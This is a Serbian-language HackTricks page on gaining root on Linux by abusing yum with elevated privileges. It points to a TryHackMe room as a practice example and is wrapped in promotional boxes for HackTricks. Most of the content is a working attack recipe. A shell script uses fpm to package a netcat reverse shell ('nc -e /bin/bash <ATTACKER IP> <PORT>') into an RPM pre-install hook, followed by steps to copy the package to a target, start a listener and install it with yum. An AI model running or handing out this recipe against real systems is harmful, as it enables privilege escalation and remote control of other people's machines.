<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite videti **vašu kompaniju oglašenu na HackTricks-u** ili **preuzeti HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Dodatni primeri vezani za yum mogu se pronaći na [gtfobins](https://gtfobins.github.io/gtfobins/yum/).

# Izvršavanje proizvoljnih komandi putem RPM paketa
## Provera okruženja
Da biste iskoristili ovaj vektor, korisnik mora moći da izvršava yum komande kao korisnik sa višim privilegijama, tj. root.

### Radni primer ovog vektora
Radni primer ovog napada može se pronaći u sobi [daily bugle](https://tryhackme.com/room/dailybugle) na [tryhackme](https://tryhackme.com).

## Pakovanje RPM-a
U sledećem odeljku, pokriću pakovanje reverzibilne ljuske u RPM koristeći [fpm](https://github.com/jordansissel/fpm).

Primer ispod kreira paket koji uključuje okidač pre instalacije sa proizvoljnim skriptom koju napadač može definisati. Kada se instalira, ovaj paket će izvršiti proizvoljnu komandu. Za demonstraciju sam koristio jednostavan primer reverzibilne netcat ljuske, ali ovo se može promeniti po potrebi.
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# Hvatanje ljuske
Koristeći prethodni primer i pretpostavljajući da se `yum` može izvršiti kao korisnik sa višim privilegijama.

1. **Prebacite** rpm na ciljni računar
2. **Pokrenite** osluškivač na vašem lokalnom računaru, kao što je [primer netcat osluškivač](/shells/shells/linux#netcat)
3. **Instalirajte** ranjiv paket `yum localinstall -y exploited-1.0-1.noarch.rpm`


<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
